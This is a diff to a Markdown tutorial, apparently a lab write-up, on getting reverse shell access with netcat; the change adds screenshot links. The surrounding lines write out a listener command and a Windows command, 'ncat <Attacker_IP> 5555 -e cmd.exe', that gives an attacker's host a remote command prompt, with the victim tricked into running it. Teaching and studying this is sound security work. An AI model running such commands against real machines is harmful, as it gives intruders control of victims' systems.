@@ -42,13 +42,21 @@ Victim's Machine: When compromised, it connects back to the attacker's machine, 
 
 **Command**: nc -lvp 5555
 
+![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/a8b13cfa76e8c0df3e40224d2b9f102ba15a2039/images/5.png)
+
 **Victim** (Windows): The attacker gets the victim to run this command.
 
 **Command**: ncat <**Attacker_IP**> 5555 -e cmd.exe
 
+![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/a8b13cfa76e8c0df3e40224d2b9f102ba15a2039/images/6.png)
+
 **This means**: "Connect to the attacker’s IP on port 5555 and give them access to my Windows command prompt."
 
+![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/a8b13cfa76e8c0df3e40224d2b9f102ba15a2039/images/7.png)
+
 **Result**: The attacker now has control over the Windows machine.
+
+![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/a8b13cfa76e8c0df3e40224d2b9f102ba15a2039/images/8.png)
 
 # In Summary:
 **Reverse Shell**: The victim's machine connects back to the attacker's machine.
